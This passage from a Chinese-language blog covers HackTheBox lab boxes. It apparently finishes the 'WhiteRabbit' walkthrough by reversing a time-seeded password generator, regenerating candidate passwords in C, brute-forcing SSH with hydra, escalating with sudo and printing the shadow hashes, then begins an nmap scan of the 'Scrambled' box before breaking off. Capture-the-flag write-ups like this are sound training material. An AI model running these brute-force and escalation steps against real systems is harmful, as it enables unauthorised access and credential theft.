settings</span><br><span class="line"></span><br><span class="line">Last login: Thu Apr 10 08:15:16 2025 from 10.10.16.2</span><br><span class="line">morpheus@whiterabbit:~$</span><br></pre></td></tr></table></figure>
<h2 id="shell-as-morpheus"><a href="#shell-as-morpheus" class="headerlink" title="shell as morpheus"></a>shell as morpheus</h2><p>在&#x2F;home目录下可以看到有用户neo，还记得我们刚开始dump数据库的时候有一个操作，是进入到&#x2F;opt&#x2F;neo-password-generator&#x2F;neo-password-generator下面有个密码机关，我们可以把它down下来看一下是什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">morpheus@whiterabbit:/opt/neo-password-generator$ ls</span><br><span class="line">neo-password-generator</span><br><span class="line">morpheus@whiterabbit:/opt/neo-password-generator$ file neo-password-generator </span><br><span class="line">-bash: file: command not found</span><br><span class="line">morpheus@whiterabbit:/opt/neo-password-generator$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 root root  4096 Aug 30  2024 .</span><br><span class="line">drwxr-xr-x 5 root root  4096 Aug 30  2024 ..</span><br><span class="line">-rwxr-xr-x 1 root root 15656 Aug 30  2024 neo-password-generator</span><br><span class="line"></span><br><span class="line">$ scp -i morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator .</span><br><span class="line">neo-password-generator                                                                                                      100%   15KB  33.9KB/s   00:00    </span><br><span class="line"></span><br><span class="line">$ file neo-password-generator </span><br><span class="line">neo-password-generator: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=479371f0c8046cb87ba4b6c3af5bc821a46d5871, for GNU/Linux 4.4.0, not stripped</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我这里用一个<a target="_blank" rel="noopener" href="https://github.com/rizinorg/cutter/releases/tag/v2.3.4">cutter</a>进行逆向<br><img src="/images/whiterabbit-14.png"><br><img src="/images/whiterabbit-15.png"><br>这里贴上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">int32_t main (void) &#123;</span><br><span class="line">    rax = *(fs:0x28);</span><br><span class="line">    *(canary) = rax;</span><br><span class="line">    eax = 0;</span><br><span class="line">    rax = var_28h;</span><br><span class="line">    esi = 0;</span><br><span class="line">    rdi = rax;</span><br><span class="line">    gettimeofday ();</span><br><span class="line">    rax = *(var_28h);</span><br><span class="line">    rsi = rax * 0x3e8;</span><br><span class="line">    rcx = *(var_20h);</span><br><span class="line">    rdx = 0x20c49ba5e353f7cf;</span><br><span class="line">    rax = rcx;</span><br><span class="line">    rdx:rax = rax * rdx;</span><br><span class="line">    rdx &gt;&gt;= 7;</span><br><span class="line">    rax = rcx;</span><br><span class="line">    rax &gt;&gt;= 0x3f;</span><br><span class="line">    rdx -= rax;</span><br><span class="line">    rax = rsi + rdx;</span><br><span class="line">    *(var_30h) = rax;</span><br><span class="line">    rax = *(var_30h);</span><br><span class="line">    rdi = *(var_30h);</span><br><span class="line">    generate_password ();</span><br><span class="line">    eax = 0;</span><br><span class="line">    rdx = *(canary);</span><br><span class="line">    rdx -= *(fs:0x28);</span><br><span class="line">    if (rdx != 0) &#123;</span><br><span class="line">        stack_chk_fail ();</span><br><span class="line">    &#125;</span><br><span class="line">    return rax;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#gettimeofday函数</span><br><span class="line">void gettimeofday (void) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#generate_password函数</span><br><span class="line">int64_t generate_password (void) &#123;</span><br><span class="line">    *(seed) = rdi;</span><br><span class="line">    rax = *(fs:0x28);</span><br><span class="line">    *(canary) = rax;</span><br><span class="line">    eax = 0;</span><br><span class="line">    *(var_30h) = 0x3e;</span><br><span class="line">    rax = *(seed);</span><br><span class="line">    edi = eax;</span><br><span class="line">    srand ();</span><br><span class="line">    *(var_34h) = 0;</span><br><span class="line">    while (*(var_34h) &lt;= 0x13) &#123;</span><br><span class="line">        rand ();</span><br><span class="line">        edx:eax = (int64_t) eax;</span><br><span class="line">        eax = *(edx:eax) / var_30h;</span><br><span class="line">        edx = *(edx:eax) % var_30h;</span><br><span class="line">        *(var_2ch) = edx;</span><br><span class="line">        eax = *(var_2ch);</span><br><span class="line">        rax = (int64_t) eax;</span><br><span class="line">        rdx = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;</span><br><span class="line">        edx = *((rax + rdx));</span><br><span class="line">        eax = *(var_34h);</span><br><span class="line">        rax = (int64_t) eax;</span><br><span class="line">        *((rbp + rax - 0x20)) = dl;</span><br><span class="line">        *(var_34h)++;</span><br><span class="line">    &#125;</span><br><span class="line">    *(var_14h) = 0;</span><br><span class="line">    rax = s;</span><br><span class="line">    puts (rax);</span><br><span class="line">    rax = *(canary);</span><br><span class="line">    rax -= *(fs:0x28);</span><br><span class="line">    if (rax != 0) &#123;</span><br><span class="line">        stack_chk_fail ();</span><br><span class="line">    &#125;</span><br><span class="line">    return rax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>是一个用于生成伪随机密码的小程序<br>main函数调用gettimeofday获取当前时间<br>基于当前时间构造一个种子<br>调用 generate_password() 函数，用 seed 来初始化随机数生成器<br>生成并打印一个由 20 个字符组成的密码</p>
<p>generate_password() 函数<br>使用 srand(seed) 初始化随机数<br>生成 20 个字符的随机密码，字符集为大小写字母和数字<br>输出密码（通过 puts()）</p>
<p>我用的python，但是不行，问了gpt说c的rand（）和python的random不一样<br>这里抄一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void generate_password(unsigned int param_1) &#123;</span><br><span class="line">    int i;</span><br><span class="line">    char password[20];</span><br><span class="line">    const char *charset = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;</span><br><span class="line">    </span><br><span class="line">    srand(param_1);</span><br><span class="line">    </span><br><span class="line">    for (i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">        int random_value = rand();</span><br><span class="line">        password[i] = charset[random_value % 62];  // 62???????</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%s\n&quot;, password);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    for (int add = 0; add &lt;= 1000; add ++)&#123;</span><br><span class="line">    	generate_password(1725028842*1000 + add);</span><br><span class="line">	&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#source code from manesec</span><br></pre></td></tr></table></figure>

<p>hydra爆破一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l neo -P pass.txt ssh://10.10.11.63 -I</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-12 22:13:19</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 1001 login tries (l:1/p:1001), ~63 tries per task</span><br><span class="line">[DATA] attacking ssh://10.10.11.63:22/</span><br><span class="line">[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 2 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 2 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-12 22:13:36</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="shell-as-neo"><a href="#shell-as-neo" class="headerlink" title="shell as neo"></a>shell as neo</h2><p>登录进来发现他是all</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">neo@whiterabbit:~$ sudo -l</span><br><span class="line">[sudo] password for neo: </span><br><span class="line">Matching Defaults entries for neo on whiterabbit:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User neo may run the following commands on whiterabbit:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以直接root了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo@whiterabbit:~$ sudo su</span><br><span class="line">root@whiterabbit:/home/neo# </span><br></pre></td></tr></table></figure>
<h2 id="shell-as-root"><a href="#shell-as-root" class="headerlink" title="shell as root"></a>shell as root</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$Rx7IRKAooZBFEEKqpflWl1$fK0BeVoPRj.EwPj9sYKZMu.Ti0EmrFpmQQZmayCKdL/:19962:0:99999:7:::                                            22:17:55 [1/1915]</span><br><span class="line">daemon:*:19836:0:99999:7:::</span><br><span class="line">bin:*:19836:0:99999:7:::    </span><br><span class="line">sys:*:19836:0:99999:7:::</span><br><span class="line">sync:*:19836:0:99999:7:::</span><br><span class="line">games:*:19836:0:99999:7:::</span><br><span class="line">man:*:19836:0:99999:7:::</span><br><span class="line">lp:*:19836:0:99999:7:::</span><br><span class="line">mail:*:19836:0:99999:7:::</span><br><span class="line">news:*:19836:0:99999:7:::</span><br><span class="line">uucp:*:19836:0:99999:7:::</span><br><span class="line">proxy:*:19836:0:99999:7:::</span><br><span class="line">www-data:*:19836:0:99999:7:::</span><br><span class="line">backup:*:19836:0:99999:7:::</span><br><span class="line">list:*:19836:0:99999:7:::</span><br><span class="line">irc:*:19836:0:99999:7:::</span><br><span class="line">_apt:*:19836:0:99999:7:::</span><br><span class="line">nobody:*:19836:0:99999:7:::</span><br><span class="line">systemd-network:!*:19836::::::</span><br><span class="line">systemd-timesync:!*:19836::::::</span><br><span class="line">messagebus:!:19836::::::</span><br><span class="line">systemd-resolve:!*:19836::::::</span><br><span class="line">pollinate:!:19836::::::</span><br><span class="line">polkitd:!*:19836::::::</span><br><span class="line">usbmux:!:19962::::::</span><br><span class="line">sshd:!:19962::::::</span><br><span class="line">neo:$y$j9T$ScA0YW6ufEiJ2wrSzstjn0$yPUlR6O.rAO4Vf9plr/iRlN4ZVKB2PLsUMZ1O27OkF2:19965:0:99999:7:::</span><br><span class="line">caddy:!:19962::::::</span><br><span class="line">morpheus:$y$j9T$0NVHqnsCvSP7z15ZcFSQQ.$2pX0MN2L3RfzRZC16AfxvrKNb680fiRx4jkEVwmQNK2:20150:0:99999:7:::</span><br><span class="line">dhcpcd:!:20171::::::</span><br><span class="line">_laurel:!:20171::::::</span><br></pre></td></tr></table></figure>

<script>
window.addEventListener('hexo-blog-decrypt', () => {
  if (window.hljs) {
    document.querySelectorAll('pre code').forEach((block) => {
      hljs.highlightElement(block);
    });
  }
});
</script>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/">HackTheBox——Tracks AD Scrambled</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/scrambled.png"></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION                                                                                                                         </span><br><span class="line">53/tcp    open  domain        Simple DNS Plus                                                                                                                 </span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                        </span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0                                                                                                                      </span><br><span class="line">| http-methods:                                                                                                                                               </span><br><span class="line">|_  Potentially risky methods: TRACE                                                                                                                          </span><br><span class="line">|_http-title: Scramble Corp Intranet                                                                                                                                                                                                                                                                                        </span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-05-05 07:59:07Z)                                                                                                                                                                                                                                </span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                   </span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)                                                                                                                                                                                                 </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:44+00:00; -57s from scanner <span class="keyword">time</span>.                                                                                                </span><br><span class="line">| ssl-cert: Subject:                                                                                                                                          </span><br><span class="line">| Subject Alternative Name: DNS:DC1.scrm.local                                                                                                                </span><br><span class="line">| Not valid before: 2024-09-04T11:14:45                                                                                                                       </span><br><span class="line">|_Not valid after:  2121-06-08T22:39:53                                                                                                                       </span><br><span class="line">445/tcp   open  microsoft-ds?                                                                                                                                 </span><br><span class="line">464/tcp   open  kpasswd5?                                                                                                                                     </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                             </span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)                                                                                                                                                                                                 </span><br><span class="line">| ssl-cert: Subject:                                                                                                                                          </span><br><span class="line">| Subject Alternative Name: DNS:DC1.scrm.local                                                                                                                </span><br><span class="line">| Not valid before: 2024-09-04T11:14:45                                                                                                                       </span><br><span class="line">|_Not valid after:  2121-06-08T22:39:53                                                                                                                       </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:44+00:00; -56s from scanner <span class="keyword">time</span>.                                                                                                </span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM                                                                                    </span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)                                                                                               </span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)                                                                                          </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:45+00:00; -56s from scanner <span class="keyword">time</span>.                                                                                                </span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                                      </span><br><span class="line">| Not valid before: 2025-05-05T07:45:38                                                                                                                       </span><br><span class="line">|_Not valid after:  2055-05-05T07:45:38                                                                                                                       </span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)                                                                                                                                                                                                 </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:44+00:00; -57s from scanner <span class="keyword">time</span>.                                                                                                                                                                                                                                                              </span><br><span class="line">| ssl-cert: Subject:                                                           </span><br><span class="line">| Subject Alternative Name: DNS:DC1.scrm.local                                                                                                                </span><br><span class="line">| Not valid before: 2024-09-04T11:14:45                                                                                                                       </span><br><span class="line">|_Not valid after:  2121-06-08T22:39:53                                                                                                                                                                                                                                                                                     </span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)                                                                                                                                                                                                 </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:44+00:00; -56s from scanner <span class="keyword">time</span>.                                                                                                </span><br><span class="line">| ssl-cert: Subject:                                                           </span><br><span class="line">| Subject Alternative Name: DNS:DC1.scrm.local                                                                                                                </span><br><span class="line">| Not valid before: 2024-09-04T11:14:45                                        </span><br><span class="line">|_Not valid after:  2121-06-08T22:39:53   </span><br><span class="line">4411/tcp  open  found?                                                         </span><br><span class="line">| fingerprint-strings:                                                         </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: </span><br><span class="line">|     SCRAMBLECORP_ORDERS_V1.0.3;                                              </span><br><span class="line">|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:                                                                                                                                                                                                                                   </span><br><span class="line">|     SCRAMBLECORP_ORDERS_V1.0.3;                                              </span><br><span class="line">|_    ERROR_UNKNOWN_COMMAND;                                                                                                                                                                                                                                                                                                </span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                         </span><br><span class="line">|_http-title: Not Found                                                        </span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                   </span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing                                                                                                            </span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                             </span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">49700/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">55408/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">55433/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                                                                                                </span><br><span class="line">SF-Port4411-TCP:V=7.95%I=7%D=5/5%Time=68187003%P=x86_64-pc-linux-gnu%r(NUL                                                                                    </span><br><span class="line">SF:L,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(GenericLines,1D,<span class="string">&quot;SCRAMBLECO                                                                                    </span></span><br><span class="line"><span class="string">SF:RP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(GetRequest,35,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3                                                                                    </span></span><br><span class="line"><span class="string">SF:;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(HTTPOptions,35,<span class="string">&quot;SCRAMBLECORP_ORDERS                                                                                    </span></span><br><span class="line"><span class="string">SF:_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(RTSPRequest,35,<span class="string">&quot;SCRAMBLECO                                                                                    </span></span><br><span class="line"><span class="string">SF:RP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(RPCCheck,1D,<span class="string">&quot;SCRA                                                                                    </span></span><br><span class="line"><span class="string">SF:MBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(DNSVersionBindReqTCP,1D,<span class="string">&quot;SCRAMBLECORP                                                                                    </span></span><br><span class="line"><span class="string">SF:_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(DNSStatusRequestTCP,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V                                                                                    </span></span><br><span class="line"><span class="string">SF:1\.0\.3;\r\n&quot;</span>)%r(Help,35,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOW                                                                                    </span></span><br><span class="line"><span class="string">SF:N_COMMAND;\r\n&quot;</span>)%r(SSLSessionReq,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>                                                                                    </span><br><span class="line">SF:)%r(TerminalServerCookie,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(TLSS                                                                                    </span><br><span class="line">SF:essionReq,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(Kerberos,1D,<span class="string">&quot;SCRAMB                                                                                    </span></span><br><span class="line"><span class="string">SF:LECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(SMBProgNeg,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.                                                                                    </span></span><br><span class="line"><span class="string">SF:0\.3;\r\n&quot;</span>)%r(X11Probe,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(FourOh                                                                                    </span><br><span class="line">SF:FourRequest,35,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;                                                                                    </span></span><br><span class="line"><span class="string">SF:\r\n&quot;</span>)%r(LPDString,35,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C                                                                                    </span></span><br><span class="line"><span class="string">SF:OMMAND;\r\n&quot;</span>)%r(LDAPSearchReq,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r                                                                                    </span><br><span class="line">SF:(LDAPBindReq,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(SIPOptions,35,<span class="string">&quot;S                                                                                    </span></span><br><span class="line"><span class="string">SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(LANDesk-                                                                                    </span><br><span class="line">SF:RC,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(TerminalServer,1D,<span class="string">&quot;SCRAMBL                                                                                    </span></span><br><span class="line"><span class="string">SF:ECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(NCP,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\                                                                                    </span></span><br><span class="line"><span class="string">SF:n&quot;</span>)%r(NotesRPC,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(JavaRMI,1D,<span class="string">&quot;SC                                                                                    </span></span><br><span class="line"><span class="string">SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(WMSRequest,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_                                                                                    </span></span><br><span class="line"><span class="string">SF:V1\.0\.3;\r\n&quot;</span>)%r(oracle-tns,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(                                                                                    </span><br><span class="line">SF:ms-sql-s,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(afp,1D,<span class="string">&quot;SCRAMBLECORP                                                                                    </span></span><br><span class="line"><span class="string">SF:_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(giop,1D,<span 